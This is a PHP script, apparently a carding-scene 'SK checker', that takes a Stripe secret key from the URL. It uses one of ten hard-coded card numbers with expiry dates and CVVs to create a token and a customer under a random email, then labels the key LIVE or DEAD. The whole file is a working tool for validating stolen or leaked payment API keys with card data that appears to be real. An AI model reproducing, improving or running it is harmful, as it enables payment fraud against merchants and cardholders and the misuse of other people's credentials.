<?php

error_reporting(0);
ini_set('display_errors', 0);



/*===[Setup]=====================*/
$sk = $_GET['sk'];

/*===[SK]========================*/
if($sk == ""){
    exit();
}

/*===[CC Info Randomizer]=================*/
$cc_info_arr[] = "4147202411104480|01|2024|919";
$cc_info_arr[] = "4427323412047246|03|2025|056";
$cc_info_arr[] = "5314620064182111|09|2028|405";
$cc_info_arr[] = "6011209825580930|03|2028|434";
$cc_info_arr[] = "4342562442889422|09|2026|217";
$cc_info_arr[] = "4403935008537641|11|2029|942";
$cc_info_arr[] = "4427323412680368|07|2025|788";
$cc_info_arr[] = "4924960341663904|11|2023|348";
$cc_info_arr[] = "4238161473838718|01|2026|458";
$cc_info_arr[] = "4659022794169029|10|2025|336";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[ Auth 1 ]==============*/
/* One */
$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
curl_close($ch1);

/* One Response */
$res1 = json_decode($curl1, true);

if(isset($res1['id'])){
    /* Two */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, "email=$email&description=Tikol4Life&source=".$res1["id"]);
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    curl_close($ch2);

    /* Two Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];
}

/*===[Response]=======================*/
if(isset($res1['error'])){
    if (isset($res1['error']['type'])&&$res1['error']['type'] == 'invalid_request_error') {
        echo '* <span class="label label-danger">DEAD </span> * <span class="label label-warning">./OshekharO </span> * <span class="label label-primary"> Your Secret Key Is Dead</span> * <span class="label label-info">'.$sk.'</span> *';
    }else{
        echo '* <span class="label label-success">LIVE </span> * <span class="label label-info">./OshekharO </span> * <span class="label label-warning"> Your Secret Key Is Active</span> * <span class="label label-primary">'.$sk.'</span> *';
    }
}else{
    if(isset($res2['error'])){
        if (isset($res2['error']['type'])&&$res2['error']['type'] == "invalid_request_error") {
            echo '* <span class="label label-danger">DEAD </span> * <span class="label label-primary"> Your Secret Key Is Dead</span> * <span class="label label-info">'.$sk.'</span> *';
        }else{
            echo '* <span class="label label-success">LIVE </span> * <span class="label label-info">./OshekharO </span> * <span class="label label-warning"> Your Secret Key Is Active</span> * <span class="label label-primary">'.$sk.'</span> *';
        }
    }else{
        echo '* <span class="label label-success">LIVE </span> * <span class="label label-info">./OshekharO </span> * <span class="label label-warning"> Your Secret Key Is Active</span> * <span class="label label-primary">'.$sk.'</span> *';
    }
}




/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@yahoo.com';
}
?>
